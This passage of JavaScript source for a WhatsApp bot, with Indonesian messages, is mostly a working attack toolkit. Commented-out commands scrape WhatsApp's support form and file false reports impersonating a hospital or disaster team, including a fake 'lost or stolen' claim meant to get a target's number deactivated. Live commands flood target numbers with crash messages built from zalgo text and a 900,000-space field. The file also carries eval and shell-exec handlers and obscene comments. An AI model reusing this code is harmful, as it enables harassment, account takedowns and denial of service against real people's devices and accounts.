if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "IPHONE")
form.append("your_message", `We, from the Hospital, inform you that our official account [${targetnya}] has been permanently blocked. We believe this is a system error. This blockage disrupted our operations and communication with patients. If not promptly restored, we will consider legal action. Please pay attention and follow up immediately.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "5")
form.append("__hs", "19858.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
joreply(
`🗂️Unban Sucess Tunggu, Tunggu 1 - 48 Jam👌.

!Note: Kami Tidak Menjamin Nomor Anda Akan Pulih. # Account : ${targetnya}
`
)
} else if (payload.includes(`"payload":false`)) {
joreply(
`
Payload.include(" payload": false )

❗🗣️: Unban Gagal, Kemungkinan Sedang Limit
`
)
} else joreply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else joreply('Masukkan nomor yang dituju!')
}
break
//=================================================//
case 'unbanv2': {
if (!isPremium) return joreply(mess.premium)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "IPHONE")
form.append("your_message", `We from the Emergency Response Team, would like to urgently report that our official account [${targetnya}] has been permanently blocked. This blockage hampers fast and effective coordination in the natural disaster emergency response that we handle. WhatsApp is our main channel for communicating with volunteers, field coordinators and other related parties. Without access to the account, rescue and assistance efforts for victims are hampered. We sincerely request that our account be restored immediately to continue our humanitarian mission. If it is not restored immediately, we will be forced to seek alternatives and consider legal action. Please pay attention and follow up immediately. Thank You`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "5")
form.append("__hs", "19858.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
joreply(
`🗂️Unban Sucess Tunggu, Tunggu 1 - 48 Jam👌.

!Note: Kami Tidak Menjamin Nomor Anda Akan Pulih. # Account : ${targetnya}
`
)
} else if (payload.includes(`"payload":false`)) {
joreply(
`
Payload.include(" payload": false )

❗🗣️: Unban Gagal, Kemungkinan Sedang Limit
`
)
} else joreply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else joreply('Masukkan nomor yang dituju!')
}
break
//=================================================//
case 'resetcode': {
if (!isPremium) return joreply(mess.premium)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "IPHONE")
form.append("your_message", `"REGISTRATION", Saya tidak menerima kode pendaftaran pada nomor ini, tolong pulihkan `)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "5")
form.append("__hs", "19858.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
joreply(
`🗂️Reset Sucess Tunggu, Tunggu 1 - 48 Jam👌.

!Note: Kami Tidak Menjamin Kode otp Anda Akan dapat dikirim lagi.
# Account : ${targetnya}
`
)
} else if (payload.includes(`"payload":false`)) {
joreply(
`
Payload.include(" payload": false )

❗🗣️: Reset Gagal, Kemungkinan Sedang Limit
`
)
} else joreply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else joreply('Masukkan nomor yang dituju!')
}
break
//=================================================//
case 'kenon': {
if (!isPremium) return joreply(mess.premium)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "IPHONE")
form.append("your_message", `Lost or Stolen, Please, I request you to deactivate this number, someone cloned my number and I request you to deactivate my number so that the cloner does not save my account, or I will file a lawsuit against support@supportwhatsapp.com. `)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "5")
form.append("__hs", "19858.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
joreply(
`Succes, !Note: Kami Tidak Menjamin Kenon akan berhasil 100%.
# Account : ${targetnya}
`
)
} else if (payload.includes(`"payload":false`)) {
joreply(
`
Payload.include(" payload": false )

❗🗣️: Kenon Gagal, Kemungkinan Sedang Limit
`
)
} else joreply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else joreply('Masukkan nomor yang dituju!')
}
break
*/




//Kontol Bapak Kau Pecah





case 'bgtes': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
await ryozingod.sendVideoAsSticker(m.chat, mengkece, force, { packname: 'Spider Execution Vault', author: 'TheZetsuboXygen' })
}
}
break

case 'penis': case 'night-night' : {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": mengkece
     }
  }
}
}), { userJid: m.chat, quoted: force })
await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'penis2': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: m })
await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'penis3': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: force })
await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'suck-it': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'sor-ry': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: force })
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'null-chace': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
ngeloc(m.chat, force)
}
await joreply('✅')
}
break
//=================================================//
case 'sam-did': {
if (!isPremium) return 
for (let j = 0; j < 5; j++) {
await ngeloc(m.chat, force)
}
await ryozingod.sendMessage(m.chat, {
contextInfo: {
mentionedJid: ['00000@s.whatsapp.net'],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
jpegThumbnail: fakejpg,
title: `SPIDER-V600💀`,
body: `⁗ ⋄Target down 💀🥹`,
previewType: "VIDEO",
sourceUrl: `༑ Taira 🖐️⿻`,
mediaType: 1,
mediaUrl: 'https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K'
}
},
text: 'Suck my dick,hehe'
}, {
quoted: ryobug
})
}
break
//=================================================//
case 'ma-gic': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
  for (let j = 10; j < q; j++) {
    await ngeloc(target, ryobug)
  }
 await joreply('✅')
}
break
//=================================================//
case 'ltest': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮"
    },
    "footer": {
      "text": "›          #ryozingoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(900000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
await sleep(700)
}
}
break
//=================================================//

default:
if (budy.startsWith('=>')) {
if (!isDeveloper) return joreply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return joreply(bang)
}
try {
joreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
joreply(String(e))
}
}
//=================================================//
if (budy.startsWith('>')) {
if (!isDeveloper) return joreply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await joreply(evaled)
} catch (err) {
await joreply(String(err))
}
}
//=================================================//
if (budy.startsWith('$')) {
if (!isDeveloper) return joreply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if (err) return joreply(`${err}`)
if (stdout) return joreply(`${stdout}`)
})
}
}
} catch (err) {
peki = async () => {
//ryozingod.sendMessage(global.ownMain + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
//await sleep(1000)
//m.reply(`
//❌ Eror Ditemukan. Eror Succes Dilaporkan Ke Contributor Bot, Mohon Tunggu Beberapa Waktu Sampai Owner Memperbaiki Eror Tersebut ✅

//${util.format(err)}`)
console.log(util.format(err))
}
peki()
}
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
